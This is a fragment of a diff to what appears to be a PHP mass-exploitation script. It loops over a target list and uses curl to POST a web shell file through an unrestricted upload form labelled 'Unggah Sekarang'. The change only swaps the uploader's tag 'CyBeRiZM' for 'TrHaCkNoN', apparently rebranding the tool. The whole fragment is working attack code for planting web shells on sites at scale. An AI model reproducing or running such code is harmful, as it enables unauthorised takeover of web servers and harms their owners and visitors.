@@ -68,7 +68,7 @@ foreach($lists as $target){
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, array("fileTitle"=>"CyBeRiZM" , "file2attach"=>"@$shell" , "upload"=>"Unggah Sekarang"));
+        curl_setopt($ch, CURLOPT_POSTFIELDS, array("fileTitle"=>"TrHaCkNoN" , "file2attach"=>"@$shell" , "upload"=>"Unggah Sekarang"));
         curl_exec($ch);
        
         $cek = curl_init();
